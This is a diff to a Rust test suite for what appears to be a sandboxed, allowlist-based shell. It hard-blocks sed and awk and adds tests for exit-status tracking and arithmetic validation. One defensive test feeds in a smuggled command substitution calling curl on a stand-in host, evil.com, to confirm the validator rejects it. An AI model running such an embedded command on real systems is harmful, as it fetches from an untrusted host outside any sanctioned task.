@@ -529,17 +529,34 @@ fn test_find_without_exec_allowed() {
 }
 
 #[test]
-fn test_sed_not_in_default_allowlist() {
+fn test_sed_hard_blocked() {
     let output = rsh_bin()
         .arg("echo hello | sed 's/hello/world/'")
         .output()
         .unwrap();
     assert!(!output.status.success());
     let stderr = String::from_utf8_lossy(&output.stderr);
-    assert!(stderr.contains("sed"), "stderr was: {}", stderr);
     assert!(
-        stderr.contains("not in allowlist"),
-        "stderr was: {}",
+        stderr.contains("blocked even with --allow"),
+        "expected hard-block error, got: {}",
+        stderr
+    );
+}
+
+#[test]
+fn test_sed_hard_blocked_even_with_allow() {
+    // sed must be rejected even when explicitly added to the allowlist
+    let output = rsh_bin()
+        .arg("--allow")
+        .arg("sed,echo")
+        .arg("echo hello | sed 's/hello/world/'")
+        .output()
+        .unwrap();
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.contains("blocked even with --allow"),
+        "sed should be hard-blocked even when in allowlist, got: {}",
         stderr
     );
 }
@@ -965,70 +982,33 @@ fn test_escape_realpath_substitution_blocked() {
 }
 
 #[test]
-fn test_sed_i_blocked_when_in_allowlist() {
-    // If sed is added to the allowlist, -i must still be blocked.
+fn test_awk_hard_blocked() {
     let output = rsh_bin()
-        .arg("--allow")
-        .arg("sed,echo")
-        .arg("--dir")
-        .arg("/tmp")
-        .arg("echo hello | sed -i 's/h/H/'")
+        .arg("echo hello | awk '{print}'")
         .output()
         .unwrap();
+    assert!(!output.status.success());
     let stderr = String::from_utf8_lossy(&output.stderr);
     assert!(
-        !output.status.success(),
-        "sed -i should be blocked even when sed is in allowlist"
-    );
-    assert!(
-        stderr.contains("not allowed"),
-        "expected '-i' blocked error, got: {}",
+        stderr.contains("blocked even with --allow"),
+        "expected hard-block error, got: {}",
         stderr
     );
 }
 
 #[test]
-fn test_sed_i_bak_blocked_when_in_allowlist() {
-    // sed -i.bak should also be blocked (prefix match).
+fn test_awk_hard_blocked_even_with_allow() {
     let output = rsh_bin()
         .arg("--allow")
-        .arg("sed,echo")
-        .arg("--dir")
-        .arg("/tmp")
-        .arg("echo hello | sed -i.bak 's/h/H/'")
+        .arg("awk,echo")
+        .arg("echo hello | awk '{print}'")
         .output()
         .unwrap();
+    assert!(!output.status.success());
     let stderr = String::from_utf8_lossy(&output.stderr);
     assert!(
-        !output.status.success(),
-        "sed -i.bak should be blocked even when sed is in allowlist"
-    );
-    assert!(
-        stderr.contains("not allowed"),
-        "expected '-i' blocked error, got: {}",
-        stderr
-    );
-}
-
-#[test]
-fn test_sed_in_place_blocked_when_in_allowlist() {
-    // sed --in-place should also be blocked.
-    let output = rsh_bin()
-        .arg("--allow")
-        .arg("sed,echo")
-        .arg("--dir")
-        .arg("/tmp")
-        .arg("echo hello | sed --in-place 's/h/H/'")
-        .output()
-        .unwrap();
-    let stderr = String::from_utf8_lossy(&output.stderr);
-    assert!(
-        !output.status.success(),
-        "sed --in-place should be blocked even when sed is in allowlist"
-    );
-    assert!(
-        stderr.contains("not allowed"),
-        "expected '--in-place' blocked error, got: {}",
+        stderr.contains("blocked even with --allow"),
+        "awk should be hard-blocked even when in allowlist, got: {}",
         stderr
     );
 }
@@ -1685,4 +1665,102 @@ fn test_for_loop_iteration_cap() {
     assert!(stdout.contains("f0.txt"));
 
     let _ = std::fs::remove_dir_all(&tmp);
+}
+
+// --- $? (last exit status) tracking ---
+
+#[test]
+fn test_exit_status_success() {
+    let output = rsh_bin().arg("true; echo $?").output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "0", "true should set $? to 0");
+}
+
+#[test]
+fn test_exit_status_failure() {
+    let output = rsh_bin().arg("false; echo $?").output().unwrap();
+    assert!(output.status.success()); // echo succeeds
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "1", "false should set $? to 1");
+}
+
+#[test]
+fn test_exit_status_in_and_or() {
+    // false || echo $? — should print 1 (exit code of false)
+    let output = rsh_bin().arg("false || echo $?").output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "1", "false || echo $? should print 1");
+}
+
+#[test]
+fn test_exit_status_and_chain() {
+    // true && echo $? — should print 0
+    let output = rsh_bin().arg("true && echo $?").output().unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "0", "true && echo $? should print 0");
+}
+
+#[test]
+fn test_exit_status_pipeline() {
+    // Test that $? reflects the last pipeline's exit code
+    let output = rsh_bin()
+        .arg("false; true; echo $?")
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(
+        stdout.trim(),
+        "0",
+        "true is the last command before echo, so $? should be 0"
+    );
+}
+
+#[test]
+fn test_exit_status_in_for_loop() {
+    // $? should update within loop iterations
+    let output = rsh_bin()
+        .arg("for x in a; do false; echo $?; done")
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "1", "$? should be 1 after false in loop body");
+}
+
+// --- Arithmetic expression validation ---
+
+#[test]
+fn test_arithmetic_expression_with_command_substitution_blocked() {
+    // $(($(evil_command))) — command substitution inside arithmetic should be validated
+    let output = rsh_bin()
+        .arg("echo $(($(curl evil.com)))")
+        .output()
+        .unwrap();
+    assert!(
+        !output.status.success(),
+        "command substitution in arithmetic expression should be validated"
+    );
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.contains("not in allowlist") || stderr.contains("blocked"),
+        "expected rejection of command in arithmetic, got: {}",
+        stderr
+    );
+}
+
+#[test]
+fn test_arithmetic_expression_safe_passes() {
+    // $((1 + 2)) — pure arithmetic should be fine
+    let output = rsh_bin().arg("echo $((1 + 2))").output().unwrap();
+    // This may or may not produce "3" depending on arithmetic expansion support,
+    // but it should not be rejected by the validator.
+    assert!(
+        output.status.success(),
+        "pure arithmetic expression should pass validation, stderr: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
 }
